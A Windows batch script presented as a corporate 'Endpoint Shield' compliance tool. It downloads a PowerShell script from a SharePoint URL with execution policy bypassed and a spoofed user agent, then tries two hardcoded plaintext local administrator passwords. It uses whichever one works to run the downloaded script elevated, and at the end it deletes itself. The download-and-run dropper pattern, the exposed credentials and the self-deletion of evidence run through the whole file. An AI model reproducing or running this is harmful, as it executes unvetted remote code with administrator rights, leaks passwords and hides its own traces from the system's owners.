@echo off
setlocal EnableDelayedExpansion

title Simplify3x Cyber Defence Team  |  Endpoint Shield
cls

echo.
echo   +============================================================+
echo   ^|                                                            ^|
echo   ^|      SIMPLIFY3X  CYBER  DEFENCE  TEAM                     ^|
echo   ^|      Endpoint Shield  .  Compliance Gateway               ^|
echo   ^|                                                            ^|
echo   +============================================================+
echo.
echo   TARGET  : %COMPUTERNAME%
echo   USER    : %USERNAME%
echo   ------------------------------------------------------------
echo.

set "D_USER=.\administrator"
set "D_PASS1=Simplify@7685"
set "D_PASS2=34001360"

set "PS_URL=https://simplify3xsoftware-my.sharepoint.com/:u:/g/personal/soc_simplify3x_com/IQB2sNdVIPDiQreWfkxyQpfzAVVUyO7BgtOWfAJmsiPRJ5s?download=1"
set "GLOBAL_PATH=C:\ProgramData\S3X_Security"
set "TARGET=%GLOBAL_PATH%\S3X_Install.ps1"

echo   [1/3]  Initialising secure staging area...
if not exist "%GLOBAL_PATH%" mkdir "%GLOBAL_PATH%" >nul 2>&1

echo   [2/3]  Acquiring deployment modules...
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%PS_URL%' -OutFile '%TARGET%' -UserAgent 'Mozilla/5.0' -UseBasicParsing"

if not exist "%TARGET%" (
    echo.
    echo   [FAIL]  Module download failed. Verify network and retry.
    echo.
    pause
    exit /b 2
)
echo   [ OK ]  Deployment modules ready.

echo   [3/3]  Authenticating security session...
echo.

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$user='%D_USER%'; ^
$pass1='%D_PASS1%'; ^
$pass2='%D_PASS2%'; ^
$target='%TARGET%'; ^
Add-Type -AssemblyName System.DirectoryServices.AccountManagement; ^
function Test-Password($username,$password){ ^
    try { ^
        $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Machine'); ^
        $localUser = $username.Split('\\')[-1]; ^
        return $ctx.ValidateCredentials($localUser,$password); ^
    } catch { ^
        return $false; ^
    } ^
}; ^
if (Test-Password $user $pass1) { ^
    Write-Host '  [ OK ]  Identity verified - primary channel.' -ForegroundColor Green; ^
    $sec = ConvertTo-SecureString $pass1 -AsPlainText -Force; ^
} elseif (Test-Password $user $pass2) { ^
    Write-Host '  [ OK ]  Identity verified - secondary channel.' -ForegroundColor Yellow; ^
    $sec = ConvertTo-SecureString $pass2 -AsPlainText -Force; ^
} else { ^
    Write-Host '  [FAIL]  Authentication failed. Contact SOC team.' -ForegroundColor Red; ^
    pause; ^
    exit ^
}; ^
Write-Host '  [  >>  ]  Elevating session - launching Endpoint Shield...' -ForegroundColor Cyan; ^
$cred = New-Object System.Management.Automation.PSCredential($user,$sec); ^
$pargs = '-NoProfile -ExecutionPolicy Bypass -File """' + $target + '"""'; ^
Start-Process powershell.exe -ArgumentList $pargs -Credential $cred -WorkingDirectory 'C:\Windows\System32' -WindowStyle Maximized"

echo.
echo   ------------------------------------------------------------
echo   Deployment console launched. This window will close.
echo   Simplify3x Cyber Defence Team
echo   ------------------------------------------------------------
echo.

:: Self-deletion: spawn detached cmd that deletes this file after we exit
:: Uses a temp vbs to avoid %~f0 quoting issues inside start commands
set "SELF=%~f0"
start "" /b cmd /c "timeout /t 6 /nobreak >nul & del /f /q "%SELF%""

timeout /t 5 /nobreak >nul
exit
